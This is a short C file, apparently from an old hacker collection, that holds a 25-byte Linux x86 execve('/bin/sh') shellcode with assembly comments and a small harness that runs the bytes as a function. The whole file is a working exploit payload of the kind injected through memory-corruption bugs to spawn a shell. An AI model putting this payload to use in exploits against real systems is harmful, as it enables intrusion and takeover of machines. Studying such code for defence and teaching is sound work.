#include <stdio.h>
#include <stdlib.h>

/* linux/x86 25-byte execve() /bin/sh shellcode.   */
u_char c0de[] = /* anathema@hack.co.za */
"\x29\xC0"                /* subl %eax, %eax       */
"\x50"                    /* pushl %eax            */

/* We use 0x2f, 0x2f ("//") so as not to have      */
/* to correct %esp after this push.                */
"\x68\x2F\x2F\x73\x68"    /* pushl $0x68732f2f     */
"\x68\x2F\x62\x69\x6E"    /* pushl $0x6e69622f     */
"\x89\xE3"                /* movl %esp, %ebx       */

/* and argv[0]=NULL; -save us a couple more bytes  */
"\x50"                    /* pushl %eax            */
"\x89\xE2"                /* movl %esp, %edx       */
"\x54"                    /* pushl %esp            */
"\x89\xE1"                /* movl %esp, %ecx       */
"\xB0\x0B"                /* movb $0x0b, %al       */
"\xCD\x80";               /* int $0x80             */

main()
{
  void (*sc)() = (void *)c0de;
  printf("%d bytes\n", strlen(c0de));
  sc();
}

/* EOF */
